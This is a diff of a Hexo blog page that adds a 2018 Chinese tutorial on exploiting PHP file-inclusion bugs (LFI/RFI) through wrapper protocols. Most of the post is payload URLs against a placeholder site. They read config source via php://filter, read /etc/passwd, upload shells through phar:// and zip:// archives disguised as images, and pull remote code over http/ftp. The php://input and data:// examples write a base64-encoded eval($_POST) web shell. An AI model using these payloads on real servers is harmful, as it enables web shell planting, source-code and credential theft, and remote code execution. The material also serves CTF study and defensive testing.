@@ -76,7 +76,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="文件包含," />
 
 
 
@@ -89,16 +89,18 @@
 
 
 
-<meta name="description" content="徒然">
-<meta property="og:type" content="website">
-<meta property="og:title" content="smelond&#39;s Blog">
-<meta property="og:url" content="http://smelond.com/tags/hexo/index.html">
+<meta name="description" content="不是很凑巧 天气这么好。本地文件包含（Local File Include） 远程文件包含（Remote File Include），大概就是一个文件里面包含另外一个文件，程序员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这中文件调用的过程一般被称为文件包含。">
+<meta name="keywords" content="文件包含">
+<meta property="og:type" content="article">
+<meta property="og:title" content="LFI以及RFI(文件包含)伪协议利用小技巧">
+<meta property="og:url" content="http://smelond.com/2018/09/04/LFI以及RF(文件包含)伪协议利用小技巧/index.html">
 <meta property="og:site_name" content="smelond&#39;s Blog">
-<meta property="og:description" content="徒然">
+<meta property="og:description" content="不是很凑巧 天气这么好。本地文件包含（Local File Include） 远程文件包含（Remote File Include），大概就是一个文件里面包含另外一个文件，程序员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这中文件调用的过程一般被称为文件包含。">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2018-09-04T07:30:50.009Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="smelond&#39;s Blog">
-<meta name="twitter:description" content="徒然">
+<meta name="twitter:title" content="LFI以及RFI(文件包含)伪协议利用小技巧">
+<meta name="twitter:description" content="不是很凑巧 天气这么好。本地文件包含（Local File Include） 远程文件包含（Remote File Include），大概就是一个文件里面包含另外一个文件，程序员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这中文件调用的过程一般被称为文件包含。">
 
 
 
@@ -128,13 +130,13 @@
 
 
 
-  <link rel="canonical" href="http://smelond.com/tags/hexo/"/>
+  <link rel="canonical" href="http://smelond.com/2018/09/04/LFI以及RF(文件包含)伪协议利用小技巧/"/>
 
 
 
 
 
-  <title>标签: hexo | smelond's Blog</title>
+  <title>LFI以及RFI(文件包含)伪协议利用小技巧 | smelond's Blog</title>
   
 
 
@@ -163,7 +165,7 @@
     
   
 
-  <div class="container sidebar-position-left ">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -301,82 +303,262 @@
           <div id="content" class="content">
             
 
-  
-  
-  
-  <div class="post-block tag">
+  <div id="posts" class="posts-expand">
+    
 
-    <div id="posts" class="posts-collapse">
-      <div class="collection-title">
-        <h1>hexo<small>标签</small>
-        </h1>
-      </div>
+  
 
-      
-        
+  
+  
+  
 
   <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://smelond.com/2018/09/04/LFI以及RF(文件包含)伪协议利用小技巧/">
 
-      <h2 class="post-title">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="smelond">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="smelond's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
         
-            <a class="post-title-link" href="/2018/08/09/hexo从github移动到centos个人服务器/" itemprop="url">
-              
-                <span itemprop="name">hexo从github移动到centos个人服务器</span>
-              
-            </a>
         
-      </h2>
+          <h1 class="post-title" itemprop="name headline">LFI以及RFI(文件包含)伪协议利用小技巧</h1>
+        
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-08-09T17:51:41+08:00"
-              content="2018-08-09" >
-          08-09
-        </time>
-      </div>
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-04T10:09:52+08:00">
+                2018-09-04
+              </time>
+            
 
-    </header>
-  </article>
+            
 
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/WEB安全/" itemprop="url" rel="index">
+                    <span itemprop="name">WEB安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/09/04/LFI以及RF(文件包含)伪协议利用小技巧/" class="leancloud_visitors" data-flag-title="LFI以及RFI(文件包含)伪协议利用小技巧">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+              <div class="post-description">
+                  <blockquote class="blockquote-center">不是很凑巧 天气这么好。</blockquote>本地文件包含（Local File Include） 远程文件包含（Remote File Include），大概就是一个文件里面包含另外一个文件，程序员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这中文件调用的过程一般被称为文件包含。
+              </div>
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-        
+      
 
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2018/06/21/hexo从windows搬家到deepin/" itemprop="url">
-              
-                <span itemprop="name">hexo从windows搬家到deepin</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-06-21T21:16:43+08:00"
-              content="2018-06-21" >
-          06-21
-        </time>
-      </div>
-
-    </header>
-  </article>
-
+      
+        <h3 id="包含文件的函数"><a href="#包含文件的函数" class="headerlink" title="包含文件的函数"></a>包含文件的函数</h3><ul>
+<li>require</li>
+<li>include</li>
+<li>require_once</li>
+<li>include_once</li>
+<li>包含函数一共有4个，主要作用为包含并允许指定文件。<br>比如include($file)，当$file变量可控的情况下，我们就可以包含任意文件，从而达到getshell的目的。<br>在不同的配置环境下，可以包含不同的文件。因此又分为远程文件包含和本地文件包含。<br>在allow_url_include = On以及allow_url_fopen = On时，允许远程包含文件，而默认情况下allow_url_include = Off</li>
+</ul>
+<h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><h4 id="php的伪协议有："><a href="#php的伪协议有：" class="headerlink" title="php的伪协议有："></a>php的伪协议有：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">// — 访问各个输入/输出流（I/O streams）</span></span><br><span class="line">file:<span class="comment">// — 访问本地文件系统</span></span><br><span class="line">phar:<span class="comment">// — PHP 归档</span></span><br><span class="line">zip:<span class="comment">// - 压缩流</span></span><br><span class="line">bzip2:<span class="comment">// - 压缩流</span></span><br><span class="line">zlib:<span class="comment">// — 压缩流</span></span><br><span class="line">data:<span class="comment">// — 数据（RFC 2397）</span></span><br><span class="line">http:<span class="comment">// — 访问 HTTP(s) 网址</span></span><br><span class="line">ftp:<span class="comment">// — 访问 FTP(s) URLs</span></span><br><span class="line">glob:<span class="comment">// — 查找匹配的文件路径模式</span></span><br><span class="line">ssh2:<span class="comment">// — Secure Shell 2</span></span><br><span class="line">rar:<span class="comment">// — RAR</span></span><br><span class="line">ogg:<span class="comment">// — 音频流</span></span><br><span class="line">expect:<span class="comment">// — 处理交互式的流</span></span><br></pre></td></tr></table></figure>
+<p>zip://, bzip2://, zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名。</p>
+<h4 id="常用的伪协议："><a href="#常用的伪协议：" class="headerlink" title="常用的伪协议："></a>常用的伪协议：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">// — 访问各个输入/输出流（I/O streams）</span></span><br><span class="line">file:<span class="comment">// — 访问本地文件系统</span></span><br><span class="line">phar:<span class="comment">// — PHP 归档</span></span><br><span class="line">zip:<span class="comment">// — 压缩流</span></span><br><span class="line">data:<span class="comment">// — 数据（RFC 2397）</span></span><br><span class="line">http:<span class="comment">// — 访问 HTTP(s) 网址</span></span><br><span class="line">ftp:<span class="comment">// — 访问 FTP(s) URLs</span></span><br></pre></td></tr></table></figure>
+<h4 id="php-协议"><a href="#php-协议" class="headerlink" title="php://协议"></a>php://协议</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter</span></span><br><span class="line">php:<span class="comment">//input</span></span><br></pre></td></tr></table></figure>
+<p>php://filter用于读取源码，php://input用于执行php代码。</p>
+<p>php://filter：在allow_url_fopen，allow_url_include都关闭的情况下可以正常使用，主要用于读取文件源代码并进行base64编码输出。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//www.inc.com/inc.php?file=php://filter/read=convert.base64-encode/resource=./config/db.php</span></span><br><span class="line">输出：PD9waHAgDQokY29uPW15c3FsaV9jb25uZWN0KCJsb2NhbGhvc3QiLCJyb290Iiwicm9vdCIsImRiIik7IA0KaWYgKCEkY29uKSANCnsgDQogICAgZGllKCLov57mjqXplJnor686ICIgLiBteXNxbGlfY29ubmVjdF9lcnJvcigpKTsgDQp9IA0K</span><br></pre></td></tr></table></figure></p>
+<p>将base64解码就可以看到db.php文件内容</p>
+<p>php://input：访问各个输入/输出流。CTF中经常使用file_get_contents获取php://input内容(POST)，需要开启allow_url_include，并且当enctype=”multipart/form-data”的时候 php://input是无效的<br>写入一句话<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//www.inc.com/inc.php?file=php://input</span></span><br><span class="line">post数据:</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> file_put_contents(<span class="string">"test.php"</span>,base64_decode(<span class="string">"PD9waHAgZXZhbCgkX1BPU1RbJ2NjJ10pPz4="</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<h4 id="file-协议"><a href="#file-协议" class="headerlink" title="file://协议"></a>file://协议</h4><p>file://：用于访问本地文件系统，并且不受allow_url_fopen，allow_url_include影响，file://还经常和curl函数(SSRF)结合在一起。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//www.inc.com/inc.php?file=file:///etc/passwd</span></span><br></pre></td></tr></table></figure></p>
+<h4 id="phar-协议"><a href="#phar-协议" class="headerlink" title="phar://协议"></a>phar://协议</h4><p>phar://：PHP 归档，常常跟文件包含，文件上传结合着考察。当文件上传仅仅校验mime类型与文件后缀，可以通过以下命令进行利用。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">利用方式：写入一句话shell.php -&gt; 压缩为shell.zip -&gt; 修改后缀为shell.jpg -&gt;上传到网站 -&gt; phar:<span class="comment">//shell.jpg/shell.php</span></span><br><span class="line">shell.php-&gt;shell.zip-&gt;shell.jpg-&gt;upload-&gt;phar:<span class="comment">//shell.jpg/shell.php</span></span><br><span class="line">http:<span class="comment">//www.inc.com/inc.php?file=phar://shell.jpg/shell.php</span></span><br></pre></td></tr></table></figure></p>
+<h4 id="zip-协议"><a href="#zip-协议" class="headerlink" title="zip://协议"></a>zip://协议</h4><p>zip://：在allow_url_fopen，allow_url_include都关闭的情况下可以正常使用，,类似phar://，使用如下：<br>利用方式：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">写入一句话shell.php -&gt; 压缩为shell.zip -&gt; 修改后缀为shell.jpg -&gt;上传到网站 -&gt; phar:<span class="comment">//shell.jpg/shell.php</span></span><br><span class="line">shell.php-&gt;shell.zip-&gt;shell.jpg-&gt;upload-&gt;phar:<span class="comment">//shell.jpg%23shell.php 	// %23 == #</span></span><br><span class="line">http:<span class="comment">//www.inc.com/inc.php?file=zip://./shell.jpg%23shell.php</span></span><br></pre></td></tr></table></figure></p>
+<h4 id="bzip2-协议-amp-amp-zlib"><a href="#bzip2-协议-amp-amp-zlib" class="headerlink" title="bzip2://协议 &amp;&amp; zlib://"></a>bzip2://协议 &amp;&amp; zlib://</h4><p>bzip2://协议 &amp;&amp; zlib://：在allow_url_fopen，allow_url_include都关闭的情况下可以正常使用:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">compress.bzip2:<span class="comment">//file.bz2</span></span><br><span class="line">http:<span class="comment">//www.inc.com/inc.php?file=compress.bzip2://D:/soft/phpStudy/WWW/shell.jpg</span></span><br><span class="line">http:<span class="comment">//www.inc.com/inc.php?file=compress.bzip2://./shell.jpg</span></span><br><span class="line"></span><br><span class="line">compress.zlib:<span class="comment">//file.gz</span></span><br><span class="line">http:<span class="comment">//www.inc.com/inc.php?file=compress.zlib://D:/soft/phpStudy/WWW/file.jpg</span></span><br><span class="line">http:<span class="comment">//www.inc.com/inc.php?file=compress.zlib://./file.jpg</span></span><br></pre></td></tr></table></figure></p>
+<h4 id="data-协议"><a href="#data-协议" class="headerlink" title="data://协议"></a>data://协议</h4><p>data://：需满足allow_url_fopen，allow_url_include同时开启才能使用:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//www.inc.com/inc.php?file=data://text/plain,<span class="meta">&lt;?php</span> phpinfo()<span class="meta">?&gt;</span></span></span><br><span class="line">http:<span class="comment">//www.inc.com/inc.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span></span><br><span class="line">http:<span class="comment">//www.inc.com/inc.php?file=data:text/plain,<span class="meta">&lt;?php</span> phpinfo()<span class="meta">?&gt;</span></span></span><br><span class="line">http:<span class="comment">//www.inc.com/inc.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span></span><br><span class="line">http:<span class="comment">//www.inc.com/inc.php?file=data://text/plain;base64,PD9waHAgZWNobyBmaWxlX3B1dF9jb250ZW50cygidGVzdC5waHAiLGJhc2U2NF9kZWNvZGUoIlBEOXdhSEFnWlhaaGJDZ2tYMUJQVTFSYkoyTmpKMTBwUHo0PSIpKTs/Pg==</span></span><br></pre></td></tr></table></figure></p>
+<h4 id="http-amp-amp-ftp"><a href="#http-amp-amp-ftp" class="headerlink" title="http:// &amp;&amp; ftp://"></a>http:// &amp;&amp; ftp://</h4><p>http:// &amp;&amp; ftp:// 需满足allow_url_fopen，allow_url_include同时开启才能使用，可访问内网主机主机<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=[http|https|ftp]:<span class="comment">//xxx/file.txt[?%23]	远程代码执行</span></span><br><span class="line">?file=[http|https|ftp]:<span class="comment">//xxx/file 	利用XSS执行任意代码</span></span><br><span class="line">?file=http:<span class="comment">//xxx/xss.php?xss=phpcode 	远程代码执行</span></span><br></pre></td></tr></table></figure></p>
+<p>文件包含是否支持%00截断取决于：PHP版本&lt;=5.2 可以使用%00进行截断。</p>
 
       
     </div>
+    
+    
+    
 
+	<div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  <p><span>本文标题:</span><a href="/2018/09/04/LFI以及RF(文件包含)伪协议利用小技巧/">LFI以及RFI(文件包含)伪协议利用小技巧</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 smelond 的个人博客">smelond</a></p>
+  <p><span>发布时间:</span>2018年09月04日 - 10:09</p>
+  <p><span>最后更新:</span>2018年09月04日 - 15:09</p>
+  <p><span>原始链接:</span><a href="/2018/09/04/LFI以及RF(文件包含)伪协议利用小技巧/" title="LFI以及RFI(文件包含)伪协议利用小技巧">http://smelond.com/2018/09/04/LFI以及RF(文件包含)伪协议利用小技巧/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://smelond.com/2018/09/04/LFI以及RF(文件包含)伪协议利用小技巧/"  aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+      $(".fa-clipboard").click(function(){
+      clipboard.on('success', function(){
+        swal({   
+          title: "",   
+          text: '复制成功',
+          icon: "success", 
+          showConfirmButton: true
+          });
+        });
+    });  
+</script>
+
+      
+	</div>
+	
+	
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/文件包含/" <i class="fa fa-tag"></i> 文件包含</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/08/27/St2-057漏洞复现/" rel="next" title="St2-057漏洞复现">
+                <i class="fa fa-chevron-left"></i> St2-057漏洞复现
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
+  </article>
 
-  
+
+
+    <div class="post-spread">
+      
+      <!--MOB SHARE BEGIN-->
+<div class="-mob-share-ui-button -mob-share-open">分享</div>
+<div class="-mob-share-ui" style="display: none">
+    <ul class="-mob-share-list">
+        <li class="-mob-share-weibo"><p>新浪微博</p></li>
+        <li class="-mob-share-tencentweibo"><p>腾讯微博</p></li>
+        <li class="-mob-share-qzone"><p>QQ空间</p></li>
+        <li class="-mob-share-qq"><p>QQ好友</p></li>
+		<li class="-mob-share-weixin"><p>微信</p></li>
+        <li class="-mob-share-renren"><p>人人网</p></li>
+        <li class="-mob-share-kaixin"><p>开心网</p></li>
+        <li class="-mob-share-douban"><p>豆瓣</p></li>
+        <li class="-mob-share-facebook"><p>Facebook</p></li>
+        <li class="-mob-share-twitter"><p>Twitter</p></li>
+    </ul>
+    <div class="-mob-share-close">取消</div>
+</div>
+<div class="-mob-share-ui-bg"></div>
+<script id="-mob-share" src="http://f1.webshare.mob.com/code/mob-share.js?appkey=2501104178e4c"></script>
+<!--MOB SHARE END-->
+      
+    </div>
+  </div>
 
 
           </div>
@@ -384,6 +566,15 @@
 
 
           
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8zNTEzOC8xMTY3Mw=="></div>
+    </div>
+
+  
+
+
 
         </div>
         
@@ -404,8 +595,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -508,6 +708,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#包含文件的函数"><span class="nav-number">1.</span> <span class="nav-text">包含文件的函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php伪协议"><span class="nav-number">2.</span> <span class="nav-text">php伪协议</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#php的伪协议有："><span class="nav-number">2.1.</span> <span class="nav-text">php的伪协议有：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#常用的伪协议："><span class="nav-number">2.2.</span> <span class="nav-text">常用的伪协议：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#php-协议"><span class="nav-number">2.3.</span> <span class="nav-text">php://协议</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#file-协议"><span class="nav-number">2.4.</span> <span class="nav-text">file://协议</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#phar-协议"><span class="nav-number">2.5.</span> <span class="nav-text">phar://协议</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#zip-协议"><span class="nav-number">2.6.</span> <span class="nav-text">zip://协议</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#bzip2-协议-amp-amp-zlib"><span class="nav-number">2.7.</span> <span class="nav-text">bzip2://协议 &amp;&amp; zlib://</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#data-协议"><span class="nav-number">2.8.</span> <span class="nav-text">data://协议</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#http-amp-amp-ftp"><span class="nav-number">2.9.</span> <span class="nav-text">http:// &amp;&amp; ftp://</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -659,6 +875,10 @@
   
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
@@ -687,6 +907,17 @@
 
 
 
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
   
 
 
